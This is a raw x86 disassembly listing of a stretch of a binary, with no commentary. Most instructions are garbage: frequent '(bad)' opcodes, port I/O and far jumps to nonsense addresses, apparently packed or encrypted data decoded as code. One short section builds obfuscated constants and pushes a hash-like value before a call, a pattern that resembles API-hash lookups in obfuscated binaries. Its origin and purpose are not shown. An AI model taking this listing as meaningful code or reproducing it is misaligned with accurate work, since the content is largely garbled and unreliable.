  41a2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b4:	test   eax,0x54195fd6
  41a2b9:	lock sub al,0xb8
  41a2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2be:	div    ecx
  41a2c0:	pop    eax
  41a2c1:	and    ah,al
  41a2c3:	pop    edi
  41a2c4:	dec    eax
  41a2c5:	adc    al,0x46
  41a2c7:	mov    ecx,0x1330d24
  41a2cc:	icebp  
  41a2cd:	cmp    ebp,DWORD PTR [esi+0x66ea76b9]
  41a2d3:	scas   al,BYTE PTR es:[edi]
  41a2d4:	lods   al,BYTE PTR ds:[esi]
  41a2d5:	mov    esi,0x42559c08
  41a2da:	pop    ebx
  41a2db:	mov    al,ds:0xc3308dd4
  41a2e0:	pusha  
  41a2e1:	vcvtsd2ss xmm6,xmm4,xmm4
  41a2e5:	mov    ah,0x3
  41a2e7:	mov    ebp,0xb05b5b4c
  41a2ec:	in     al,0xa0
  41a2ee:	addr16 cld 
  41a2f0:	dec    ebp
  41a2f1:	push   DWORD PTR [ebx+0x26a44117]
  41a2f7:	cwde   
  41a2f8:	sub    DWORD PTR [edi+0x50],edx
  41a2fb:	outs   dx,BYTE PTR ds:[esi]
  41a2fc:	push   ebp
  41a2fd:	lock mov esp,0xeaba4d3b
  41a303:	push   es
  41a304:	jge    0x41a286
  41a306:	stos   DWORD PTR es:[edi],eax
  41a307:	mov    bl,0x5b
  41a309:	test   eax,0xbe9f023f
  41a30e:	loope  0x41a36c
  41a310:	jne    0x41a33e
  41a312:	repnz add eax,0x561f0eac
  41a318:	mov    edx,0x742eb365
  41a31d:	(bad)  
  41a31e:	(bad)  [esi+ebp*1]
  41a321:	mov    esi,0x5bdd95d3
  41a326:	iret   
  41a327:	jae    0x41a2aa
  41a329:	adc    al,0x71
  41a32b:	or     esi,edi
  41a32d:	aad    0x7
  41a32f:	dec    edi
  41a330:	dec    edx
  41a331:	neg    BYTE PTR [ebp-0x3659ad53]
  41a337:	scas   eax,DWORD PTR es:[edi]
  41a338:	pop    eax
  41a339:	or     eax,0x2a9fa7de
  41a33e:	imul   ebx,ecx,0xfdf99423
  41a344:	mov    dl,0x41
  41a346:	ret    
  41a347:	enter  0x82a6,0xaa
  41a34b:	cmp    BYTE PTR [ecx-0x6],al
  41a34e:	ror    BYTE PTR [edx],cl
  41a350:	push   ss
  41a351:	dec    edx
  41a352:	jne    0x41a31b
  41a354:	xchg   ecx,ebp
  41a356:	lock stos DWORD PTR es:[edi],eax
  41a358:	int3   
  41a359:	inc    esi
  41a35a:	or     eax,0xdea98dea
  41a35f:	lds    eax,FWORD PTR [edi]
  41a361:	mov    ah,0x74
  41a363:	sbb    esi,eax
  41a365:	ss nop
  41a367:	xchg   edx,eax
  41a368:	scas   al,BYTE PTR es:[edi]
  41a369:	jo     0x41a3dd
  41a36b:	xchg   ebp,eax
  41a36c:	push   cs
  41a36d:	enter  0xef19,0xa4
  41a371:	sbb    al,BYTE PTR [edi-0xa]
  41a374:	jo     0x41a3c7
  41a376:	in     al,dx
  41a377:	out    0x51,eax
  41a379:	mov    ch,0x31
  41a37b:	jb     0x41a337
  41a37d:	mov    bl,0xd4
  41a37f:	scas   al,BYTE PTR es:[edi]
  41a380:	push   eax
  41a381:	loope  0x41a363
  41a383:	repz out 0x47,eax
  41a386:	mov    esi,0xacc31bf1
  41a38b:	js     0x41a3c8
  41a38d:	retf   
  41a38e:	js     0x41a3a0
  41a390:	sbb    DWORD PTR [ebp+0x2f70527f],esi
  41a396:	cli    
  41a397:	xlat   BYTE PTR ds:[ebx]
  41a398:	mov    ebx,esi
  41a39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a39b:	xor    eax,0x15dfd2bc
  41a3a0:	cmp    ch,BYTE PTR [esi+0x34]
  41a3a3:	(bad)  
  41a3a4:	cld    
  41a3a5:	adc    esi,DWORD PTR [ecx-0x80]
  41a3a8:	into   
  41a3a9:	xchg   ebx,eax
  41a3aa:	jbe    0x41a3b5
  41a3ac:	fcomp  QWORD PTR [ecx+0x295bd07c]
  41a3b2:	test   al,0x1a
  41a3b4:	pushf  
  41a3b5:	pop    esi
  41a3b6:	sar    BYTE PTR [eax+ebp*4+0x14be1503],0x34
  41a3be:	mov    dh,0xff
  41a3c0:	inc    ebp
  41a3c1:	sbb    DWORD PTR [eax-0x1f],esp
  41a3c4:	jmp    0x41a371
  41a3c6:	ss inc eax
  41a3c8:	and    eax,0x8d1386ed
  41a3cd:	add    ebp,DWORD PTR ds:0x60b97c88
  41a3d3:	das    
  41a3d4:	cmp    eax,0x40120d33
  41a3d9:	inc    ebx
  41a3da:	cmp    edx,DWORD PTR [ebp-0x7e898541]
  41a3e0:	(bad)  
  41a3e1:	loop   0x41a419
  41a3e3:	and    al,0x5
  41a3e5:	and    DWORD PTR [edi+0x34bf6925],ebp
  41a3eb:	xchg   edx,eax
  41a3ec:	fwait
  41a3ed:	cmps   WORD PTR ds:[si],WORD PTR es:[di]
  41a3f0:	adc    BYTE PTR [ebx+eax*8+0x10],al
  41a3f4:	out    dx,al
  41a3f5:	sub    BYTE PTR [ecx+0x6],0x7a
  41a3f9:	add    edx,ebx
  41a3fb:	add    BYTE PTR [edx-0x60],al
  41a3fe:	pop    ebx
  41a3ff:	inc    eax
  41a400:	or     eax,0x880cc286
  41a405:	shr    BYTE PTR [eax+0x6b],1
  41a408:	imul   esp,DWORD PTR [ebp+ebx*4+0x1be3c740],0x68
  41a410:	jo     0x41a481
  41a412:	pop    ebp
  41a413:	lds    esi,FWORD PTR [ebx+0x6d]
  41a416:	or     DWORD PTR [esi-0x45],0xffffffa2
  41a41a:	test   BYTE PTR [ebx+0x3858f7ae],cl
  41a420:	je     0x41a478
  41a422:	mov    ch,BYTE PTR [esi+0x23]
  41a425:	lock sbb al,0x48
  41a428:	daa    
  41a429:	mov    cl,0x5d
  41a42b:	pop    ecx
  41a42c:	dec    ebp
  41a42d:	das    
  41a42e:	pop    es
  41a42f:	fcomp  DWORD PTR [edx]
  41a431:	cs pop eax
  41a433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a434:	ds jle 0x41a3df
  41a437:	mov    BYTE PTR [edx+0x26],dl
  41a43a:	adc    eax,0x58398b17
  41a43f:	xchg   esi,eax
  41a440:	mov    ecx,0xbf59a541
  41a445:	mov    dh,0x23
  41a447:	or     eax,0x7c279bfc
  41a44c:	iret   
  41a44d:	pop    ecx
  41a44e:	jp     0x41a41a
  41a450:	dec    eax
  41a451:	pslld  mm5,QWORD PTR [eax-0x1ec3a821]
  41a458:	repz mov bl,0xf9
  41a45b:	ds leave 
  41a45d:	sub    eax,0x6ca57a7f
  41a462:	loop   0x41a4a8
  41a464:	jg     0x41a3f2
  41a466:	mov    al,ds:0xfb226712
  41a46b:	sti    
  41a46c:	sbb    ebp,ebx
  41a46e:	dec    ebp
  41a46f:	cmp    cl,BYTE PTR [edi]
  41a471:	std    
  41a472:	fild   DWORD PTR [eax-0x40d7864e]
  41a478:	das    
  41a479:	imul   esp,DWORD PTR [ecx-0x593541f5],0x62a68fb6
  41a483:	das    
  41a484:	cld    
  41a485:	cdq    
  41a486:	push   0xf
  41a488:	adc    al,0xb7
  41a48a:	loop   0x41a4e9
  41a48c:	push   ss
  41a48d:	xor    edx,esp
  41a48f:	adc    cl,BYTE PTR fs:[esi+0x23]
  41a493:	sbb    eax,0xe2283a5f
  41a498:	test   al,0x61
  41a49a:	int    0xd1
  41a49c:	xor    dh,BYTE PTR [ecx+0x7009c437]
  41a4a2:	inc    esp
  41a4a3:	imul   ebp,DWORD PTR [ebx-0x39],0xcf3b5555
  41a4aa:	or     edx,DWORD PTR [edi+ecx*8-0x4f]
  41a4ae:	fs xchg edi,eax
  41a4b0:	inc    ebx
  41a4b1:	mov    ebx,0x4349fe6e
  41a4b6:	mov    al,ds:0x8ac334fe
  41a4bb:	fst    QWORD PTR [ebp+0x4389eccb]
  41a4c1:	mov    bl,0x20
  41a4c3:	add    eax,0x514929d
  41a4c8:	push   edx
  41a4c9:	shl    bl,1
  41a4cb:	enter  0x668d,0x6b
  41a4cf:	(bad)  
  41a4d0:	add    DWORD PTR [ecx],edi
  41a4d2:	push   0x97cb800b
  41a4d7:	add    dh,al
  41a4d9:	xor    al,0x1b
  41a4db:	xlat   BYTE PTR ds:[ebx]
  41a4dc:	repz xor dl,BYTE PTR [ecx-0x19f35e02]
  41a4e3:	in     eax,dx
  41a4e4:	pop    eax
  41a4e5:	add    DWORD PTR [edx],0x2dbbd5bf
  41a4eb:	cmp    al,0x49
  41a4ed:	jle    0x41a53c
  41a4ef:	out    dx,eax
  41a4f0:	sahf   
  41a4f1:	shl    BYTE PTR [edi+0x2],0xf0
  41a4f5:	pop    ss
  41a4f6:	outs   dx,BYTE PTR ds:[esi]
  41a4f7:	jp     0x41a4d4
  41a4f9:	int3   
  41a4fa:	or     ch,dh
  41a4fc:	adc    dl,BYTE PTR [bp+si]
  41a4ff:	imul   edi,DWORD PTR [ecx+0x3dde9237],0x54
  41a506:	xor    eax,esp
  41a508:	shl    BYTE PTR [eax+0x6f],cl
  41a50b:	pushf  
  41a50c:	(bad)  
  41a50d:	xor    al,0x1b
  41a50f:	xchg   BYTE PTR [edi+0x20],al
  41a512:	xor    dh,dl
  41a514:	outs   dx,DWORD PTR ds:[esi]
  41a515:	lods   eax,DWORD PTR ds:[esi]
  41a516:	ja     0x41a4a1
  41a518:	mov    dl,0xe
  41a51a:	cmp    eax,edx
  41a51c:	enter  0x296a,0x97
  41a520:	lods   eax,DWORD PTR ds:[esi]
  41a521:	adc    BYTE PTR [ebx+0x3e],dh
  41a524:	imul   esp,DWORD PTR [ecx],0x462972da
  41a52a:	xor    ebp,DWORD PTR [esi]
  41a52c:	push   0xffffffbe
  41a52e:	sbb    ch,BYTE PTR [ebx]
  41a530:	adc    al,0x8c
  41a532:	shr    ch,0x8c
  41a535:	mov    ecx,0xc88a8711
  41a53a:	jg     0x41a50a
  41a53c:	mov    ds:0x38b3f6f1,eax
  41a541:	push   ss
  41a542:	out    dx,al
  41a543:	cli    
  41a544:	pop    ss
  41a545:	out    0xae,al
  41a547:	mov    cl,0xc7
  41a549:	jbe    0x41a535
  41a54b:	xor    al,0x58
  41a54d:	ret    0x84ed
  41a550:	iret   
  41a551:	mov    al,ss:0xbda1f5f3
  41a557:	jns    0x41a516
  41a559:	clc    
  41a55a:	mov    DWORD PTR [ebx+0x30],ebp
  41a55d:	pop    esi
  41a55e:	xchg   edi,eax
  41a55f:	repz idiv BYTE PTR [esi-0x8a1aaee]
  41a566:	xchg   ebx,edx
  41a568:	mov    DWORD PTR [edx+0x7d],ebp
  41a56b:	mov    esp,0xe501e4b
  41a570:	push   ds
  41a571:	adc    al,0x86
  41a573:	dec    esp
  41a574:	mov    ecx,0xef9e81b9
  41a579:	push   edx
  41a57a:	(bad)  
  41a57b:	cdq    
  41a57c:	ins    BYTE PTR es:[edi],dx
  41a57d:	sbb    ebx,eax
  41a57f:	mov    dh,BYTE PTR ds:0x15c05621
  41a585:	push   es
  41a586:	inc    esp
  41a587:	push   cs
  41a588:	mov    ebp,0xc1beab46
  41a58d:	outs   dx,BYTE PTR ds:[esi]
  41a58e:	icebp  
  41a58f:	cs pop ss
  41a591:	leave  
  41a592:	inc    ebx
  41a593:	loopne 0x41a5c9
  41a595:	pusha  
  41a596:	cs retf 
  41a598:	mov    ebp,0x79f32a4f
  41a59d:	sbb    ebp,DWORD PTR [ecx+0x57f8466d]
  41a5a3:	pop    esp
  41a5a4:	gs jno 0x41a5c9
  41a5a7:	cwde   
  41a5a8:	mov    ds:0xc15e357b,eax
  41a5ad:	mov    al,ds:0xf167ecc1
  41a5b2:	dec    edi
  41a5b3:	shl    DWORD PTR [ebp+0x43a32e2f],0x31
  41a5ba:	push   esi
  41a5bb:	int3   
  41a5bc:	cmc    
  41a5bd:	rcr    DWORD PTR [ecx-0x71],1
  41a5c0:	xchg   edx,eax
  41a5c1:	ret    0xd8fe
  41a5c4:	inc    ebp
  41a5c5:	jbe    0x41a645
  41a5c7:	dec    edx
  41a5c8:	lods   eax,DWORD PTR ds:[esi]
  41a5c9:	dec    esp
  41a5ca:	sbb    esp,DWORD PTR [edx+0x301d3ff6]
  41a5d0:	adc    al,0xce
  41a5d2:	and    eax,0x586c95a1
  41a5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5d8:	test   al,0x7
  41a5da:	rcl    DWORD PTR [eax-0x27],cl
  41a5dd:	add    cl,ah
  41a5df:	leave  
  41a5e0:	dec    esi
  41a5e1:	jge    0x41a604
  41a5e3:	sub    DWORD PTR [ebx-0x181e894b],ecx
  41a5e9:	mov    ch,0x45
  41a5eb:	lods   al,BYTE PTR ds:[esi]
  41a5ec:	test   al,0x60
  41a5ee:	(bad)  
  41a5ef:	jle    0x41a5c8
  41a5f1:	and    BYTE PTR [ebp-0x42],ch
  41a5f4:	cmp    al,0x4c
  41a5f6:	lock push edi
  41a5f8:	add    edi,0x30
  41a5fb:	arpl   WORD PTR [ecx-0x49],bx
  41a5fe:	cmp    BYTE PTR [esi],bh
  41a600:	cli    
  41a601:	mov    ds:0x24d4accb,al
  41a606:	add    eax,DWORD PTR [esi-0x4413a447]
  41a60c:	clc    
  41a60d:	jmp    0x900dd7a1
  41a612:	rcl    eax,cl
  41a614:	adc    al,0xc8
  41a616:	adc    al,0xd2
  41a618:	pop    edx
  41a619:	(bad)  
  41a61a:	rol    BYTE PTR [edx+ebp*1-0x7cdb7be2],1
  41a621:	pop    ebp
  41a622:	arpl   sp,si
  41a624:	inc    esp
  41a625:	pushf  
  41a626:	repz mov al,ds:0x76d3ca8a
  41a62c:	inc    ecx
  41a62d:	jl     0x41a5e9
  41a62f:	gs add al,0x67
  41a632:	iret   
  41a633:	outs   dx,BYTE PTR ds:[esi]
  41a634:	scas   al,BYTE PTR es:[edi]
  41a635:	inc    ebx
  41a636:	or     eax,0xae656849
  41a63b:	jecxz  0x41a602
  41a63d:	cdq    
  41a63e:	ret    
  41a63f:	push   esi
  41a640:	mov    ?,WORD PTR [eax+0xe1a1377]
  41a646:	enter  0x31b0,0x9b
  41a64a:	mov    esi,0x935460c9
  41a64f:	push   0xffffffba
  41a651:	xor    DWORD PTR [edx+0x10],esp
  41a654:	(bad)  
  41a655:	ss dec edi
  41a657:	loopne 0x41a62a
  41a659:	xchg   DWORD PTR [edx+edx*1+0x1c],ecx
  41a65d:	mov    bh,0x2b
  41a65f:	ror    DWORD PTR [ebx+0x1b50244c],0xd3
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x4220ab
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	mov    DWORD PTR [eax-0x5a304f95],0x12bc1816
  41a752:	sbb    BYTE PTR [eax],bl
  41a754:	or     BYTE PTR [edi+eiz*2-0x6c5663d1],bh
  41a75b:	scas   eax,DWORD PTR es:[edi]
  41a75c:	jb     0x41a6ff
  41a75e:	adc    DWORD PTR [ebx],0xffffff87
  41a761:	jb     0x41a72a
  41a763:	enter  0x76a,0x1c
  41a767:	adc    BYTE PTR [edi+0x6e],cl
  41a76a:	test   DWORD PTR [eax+0xb],edx
  41a76d:	fld    DWORD PTR [ebx+ebp*2-0x3b]
  41a771:	pop    edx
  41a772:	adc    dl,al
  41a774:	push   ebx
  41a775:	pop    ds
  41a776:	repz push 0x14
  41a779:	lods   eax,DWORD PTR ds:[esi]
  41a77a:	push   esp
  41a77b:	or     al,ch
  41a77d:	ja     0x41a730
  41a77f:	in     al,dx
  41a780:	dec    esp
  41a781:	cmp    eax,0xe4afafaf
  41a786:	cmp    dh,BYTE PTR [eax]
  41a788:	repnz retf 
  41a78a:	xchg   ebx,eax
  41a78b:	pop    es
  41a78c:	shr    DWORD PTR [ebp-0x2751b392],cl
  41a792:	or     eax,0x8a36cd38
  41a797:	les    edi,FWORD PTR [eax-0x1a]
  41a79a:	pop    edi
  41a79b:	jg     0x41a7ab
  41a79d:	cmp    DWORD PTR [ecx-0x32df324a],edi
  41a7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7a4:	adc    BYTE PTR [ebp-0x3da28a66],ch
  41a7aa:	cmp    DWORD PTR [eax+edi*2],eax
  41a7ad:	nop
  41a7ae:	fimul  WORD PTR [esi+0x16]
  41a7b1:	call   0xe40fecf
  41a7b6:	pop    edi
  41a7b7:	aas    
  41a7b8:	aam    0x47
  41a7ba:	jle    0x41a78f
  41a7bc:	dec    ebx
  41a7bd:	mov    bl,0xfb
  41a7bf:	mov    ?,WORD PTR [ebx]
  41a7c1:	fisub  WORD PTR [ecx]
  41a7c3:	pop    ecx
  41a7c4:	cli    
  41a7c5:	mov    ebx,ecx
  41a7c7:	stos   BYTE PTR es:[edi],al
  41a7c8:	sub    DWORD PTR [edx+0x604515d3],esp
  41a7ce:	mov    al,ds:0x83749453
  41a7d3:	sbb    bl,0x18
  41a7d6:	mov    ebx,0x226a2bdf
  41a7db:	iret   
  41a7dc:	shr    DWORD PTR [eax+eiz*8],0x75
  41a7e0:	mov    ebp,0xb2ec104f
  41a7e5:	lods   eax,DWORD PTR ds:[esi]
  41a7e6:	repz mov esi,0x969af6fc
  41a7ec:	call   0xbd3b:0x6c9f74cf
  41a7f3:	add    esp,edx
  41a7f5:	add    al,0x1e
  41a7f7:	sub    BYTE PTR [ecx-0x26],ah
  41a7fa:	stos   BYTE PTR es:[edi],al
  41a7fb:	cmc    
  41a7fc:	loopne 0x41a7d4
  41a7fe:	mov    bl,0xf0
  41a800:	or     DWORD PTR ds:0x90521032,edi
  41a806:	(bad)  
  41a807:	pop    edx
  41a808:	and    eax,0xe9ad9d70
  41a80d:	loop   0x41a7e5
  41a80f:	or     al,0x4f
  41a811:	xchg   ecx,eax
  41a812:	imul   eax,edi,0x3b
  41a815:	and    ecx,ebp
  41a817:	data16 xor BYTE PTR [edx+0x7b100411],0xa5
  41a81f:	jmp    0x7b50:0xd750baf6
  41a826:	mov    ds:0x75f87499,eax
  41a82b:	pop    esp
  41a82c:	in     eax,dx
  41a82d:	stos   DWORD PTR es:[edi],eax
  41a82e:	test   eax,0xc44e011
  41a833:	sbb    BYTE PTR [eax+0x6f994285],dh
  41a839:	mov    esi,0x1c30030b
  41a83e:	clc    
  41a83f:	jp     0x41a80a
  41a841:	or     DWORD PTR [edx+0x64ff3542],edx
  41a847:	sub    eax,0xece6f7c3
  41a84c:	stos   BYTE PTR es:[edi],al
  41a84d:	punpcklbw mm6,DWORD PTR [ebp-0x88c6261]
  41a854:	and    eax,0xb4a26b9b
  41a859:	in     al,0xc7
  41a85b:	loopne 0x41a7f8
  41a85d:	mov    bl,0x21
  41a85f:	sub    BYTE PTR ds:0x131d48eb,ch
  41a865:	mov    ds:0x947f04d8,al
  41a86a:	call   0x5e90:0x16f9ada1
  41a871:	adc    al,0xb5
  41a873:	inc    ebp
  41a874:	sub    ebx,edx
  41a876:	in     eax,0x80
  41a878:	outs   dx,BYTE PTR ds:[esi]
  41a879:	cmp    BYTE PTR [esi+0xb],bl
  41a87c:	and    eax,DWORD PTR [esi]
  41a87e:	cmp    DWORD PTR [ebp+0x39],edi
  41a881:	cld    
  41a882:	sub    al,0xf3
  41a884:	stos   BYTE PTR es:[edi],al
  41a885:	test   BYTE PTR [ecx-0x76],dl
  41a888:	jne    0x41a86f
  41a88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88b:	in     al,dx
  41a88c:	cmp    DWORD PTR [eax],edx
  41a88e:	pop    ecx
  41a88f:	cmp    al,0xe4
  41a891:	dec    edi
  41a892:	mov    edx,0xaf0b9350
  41a897:	mov    dl,0x2b
  41a899:	mov    ebp,0xc7ca5fde
  41a89e:	or     DWORD PTR [esi-0x4c],edx
  41a8a1:	enter  0xe045,0xac
  41a8a5:	in     al,0x57
  41a8a7:	mov    WORD PTR [edi+0x0],cs
  41a8aa:	inc    ebx
  41a8ab:	(bad)  
  41a8ac:	fnsave [edi+0x40]
  41a8af:	shr    eax,cl
  41a8b1:	(bad)  
  41a8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b3:	loopne 0x41a843
  41a8b5:	shl    BYTE PTR [esi+esi*2-0x181944ae],cl
  41a8bc:	imul   esp,DWORD PTR [ebx+eax*8+0x42],0xffffffd5
  41a8c1:	(bad)  
  41a8c2:	jle    0x41a8cc
  41a8c4:	call   0x8b5f3d7f
  41a8c9:	adc    al,0xd
  41a8cb:	sti    
  41a8cc:	or     cl,BYTE PTR [ebp-0x3135eafc]
  41a8d2:	mov    cl,0x27
  41a8d4:	add    ecx,DWORD PTR [esi+0x6a]
  41a8d7:	(bad)  
  41a8d8:	or     eax,0xc97c8c50
  41a8dd:	loop   0x41a862
  41a8df:	sbb    ebp,edx
  41a8e1:	push   ss
  41a8e2:	xor    ah,ch
  41a8e4:	lock fisttp WORD PTR [ecx+0x397a0d32]
  41a8eb:	popf   
  41a8ec:	adc    BYTE PTR [eax+esi*4+0x5915e962],cl
  41a8f3:	inc    edx
  41a8f4:	cmc    
  41a8f5:	rcr    edx,1
  41a8f7:	stos   DWORD PTR es:[edi],eax
  41a8f8:	sti    
  41a8f9:	ret    
  41a8fa:	fwait
  41a8fb:	jmp    0xae49bcdd
  41a900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a901:	and    dl,BYTE PTR [ecx+0x73]
  41a904:	cdq    
  41a905:	js     0x41a903
  41a907:	(bad)  
  41a908:	mov    edi,0x5cacbdca
  41a90d:	jno    0x41a8f2
  41a90f:	mov    cl,BYTE PTR ss:[ebx+0x5c]
  41a913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a914:	call   0x365e:0x1e1ad347
  41a91b:	mov    ah,0xc6
  41a91d:	add    dh,BYTE PTR [ecx-0x47cf041d]
  41a923:	addr16 out dx,eax
  41a925:	xchg   ebp,eax
  41a926:	xor    eax,0x799dabf3
  41a92b:	pcmpeqw mm1,QWORD PTR [edi+0x1ca9ebba]
  41a932:	push   edi
  41a933:	pop    ds
  41a934:	les    esp,FWORD PTR [edi]
  41a936:	xchg   ebx,eax
  41a937:	call   0x125e917e
  41a93c:	push   0x27491592
  41a941:	(bad)  
  41a942:	cmp    bh,dh
  41a944:	repz xor edi,DWORD PTR [ecx]
  41a947:	gs jge 0x41a955
  41a94a:	cmp    DWORD PTR [edx-0x1fa66c83],edx
  41a950:	jle    0x41a960
  41a952:	mov    cl,0x4f
  41a954:	dec    ebp
  41a955:	dec    ecx
  41a956:	rep ins BYTE PTR es:[edi],dx
  41a958:	mov    ch,0x81
  41a95a:	mov    dh,0xce
  41a95c:	jp     0x41a8fd
  41a95e:	das    
  41a95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a960:	cli    
  41a961:	out    dx,eax
  41a962:	xchg   ebx,eax
  41a963:	arpl   WORD PTR [esi],si
  41a965:	lock dec esi
  41a967:	pop    ss
  41a968:	outs   dx,DWORD PTR ds:[esi]
  41a969:	add    edx,DWORD PTR [esi]
  41a96b:	dec    edi
  41a96c:	push   0x313958e8
  41a971:	leave  
  41a972:	mov    DWORD PTR [ecx],ecx
  41a974:	(bad)  
  41a975:	adc    DWORD PTR [eax-0x447e7e08],edi
  41a97b:	inc    ebx
  41a97c:	fwait
  41a97d:	xchg   BYTE PTR [ebp-0x39],ch
  41a980:	jp     0x41a995
  41a982:	(bad)  
  41a983:	shr    BYTE PTR [edx+0x4c],0x12
  41a987:	cmc    
  41a988:	xchg   BYTE PTR [edx+0x4ecb4026],dh
  41a98e:	pop    edi
  41a98f:	(bad)  
  41a990:	mov    ds:0x5d39227,al
  41a995:	or     ah,BYTE PTR [ebx]
  41a997:	mov    edx,0x9aabcb6e
  41a99c:	cmp    al,0xed
  41a99e:	(bad)  [edi+0x44]
  41a9a1:	loop   0x41a976
  41a9a3:	dec    edx
  41a9a4:	inc    ebp
  41a9a5:	dec    eax
  41a9a6:	mov    eax,ds:0x75619133
  41a9ac:	pusha  
  41a9ad:	sub    DWORD PTR [ebx],ebp
  41a9af:	shr    dh,0x4d
  41a9b2:	mov    eax,ds:0x61ca30ec
  41a9b7:	(bad)  
  41a9b9:	pusha  
  41a9ba:	xchg   ebp,eax
  41a9bb:	cmp    ebp,edx
  41a9bd:	sub    edx,0xfffffff6
  41a9c0:	pop    esp
  41a9c1:	outs   dx,BYTE PTR ds:[esi]
  41a9c2:	(bad)  [ebx+0x16]
  41a9c5:	push   esp
  41a9c6:	or     edx,ecx
  41a9c8:	push   edx
  41a9c9:	outs   dx,BYTE PTR ds:[esi]
  41a9ca:	xor    eax,0xff91967f
  41a9cf:	jecxz  0x41a981
  41a9d1:	mov    ch,0x95
  41a9d3:	inc    esi
  41a9d4:	and    DWORD PTR [edi-0x73958346],ebx
  41a9da:	stc    
  41a9db:	mov    al,0x76
  41a9dd:	pop    ds
  41a9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9df:	sub    al,0xb9
  41a9e1:	add    esp,esi
  41a9e3:	je     0x41aa2e
  41a9e5:	fbld   TBYTE PTR [edx]
  41a9e7:	or     al,0x66
  41a9ea:	pop    edx
  41a9eb:	dec    esi
  41a9ec:	ja     0x41aa24
  41a9ee:	repnz pop eax
  41a9f0:	pop    ecx
  41a9f1:	sbb    ebx,ebx
  41a9f3:	leave  
  41a9f4:	dec    esp
  41a9f5:	and    eax,0x3923fbe5
  41a9fa:	enter  0x376e,0xd2
  41a9fe:	leave  
  41a9ff:	sahf   
  41aa00:	les    ecx,FWORD PTR [ebp-0x51e59bfe]
  41aa06:	jmp    0xddcf:0xbc82e373
  41aa0d:	mov    ah,0xf0
  41aa0f:	jge    0x41aa50
  41aa11:	mov    al,bh
  41aa13:	bnd jmp 0x41a9c8
  41aa16:	je     0x41a9ba
  41aa18:	stos   BYTE PTR es:[edi],al
  41aa19:	test   DWORD PTR [ebx-0x71ddf280],esp
  41aa1f:	rcl    BYTE PTR [ebx],1
  41aa21:	sub    al,0xa1
  41aa23:	add    eax,0x37682b72
  41aa28:	push   0xffffffd8
  41aa2a:	aaa    
  41aa2b:	sub    al,BYTE PTR [ebx+eiz*4+0x21]
  41aa2f:	out    dx,al
  41aa30:	pop    eax
  41aa31:	push   esp
  41aa32:	test   eax,0xc1060280
  41aa37:	jmp    0x192872bb
  41aa3c:	xor    BYTE PTR [edi+0x6d6f7d8f],al
  41aa42:	fadd   QWORD PTR ds:0x4d35778d
  41aa48:	call   0xa54:0xbea9c6d5
  41aa4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa50:	outs   dx,BYTE PTR ds:[esi]
  41aa51:	jmp    DWORD PTR [edi-0x5e]
  41aa54:	jns    0x41aac5
  41aa56:	xor    ch,BYTE PTR [ecx]
  41aa58:	in     al,dx
  41aa59:	loope  0x41aabf
  41aa5b:	sahf   
  41aa5c:	xor    eax,0x303f7ddc
  41aa61:	ins    BYTE PTR es:[edi],dx
  41aa62:	sub    ch,BYTE PTR [eax-0x2848f3e3]
  41aa68:	addr16 hlt 
  41aa6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa6b:	add    cl,BYTE PTR [ecx]
  41aa6d:	xchg   ebp,eax
  41aa6e:	or     bl,BYTE PTR [edx+eiz*1-0xe]
  41aa72:	xchg   ebx,eax
  41aa73:	sub    al,0x5
  41aa75:	cmp    BYTE PTR [eax-0x30],ah
  41aa78:	clc    
  41aa79:	in     eax,dx
  41aa7a:	add    DWORD PTR [eax],ebx
  41aa7c:	jae    0x41aa5d
  41aa7e:	or     al,0x61
  41aa80:	pusha  
  41aa81:	pop    ecx
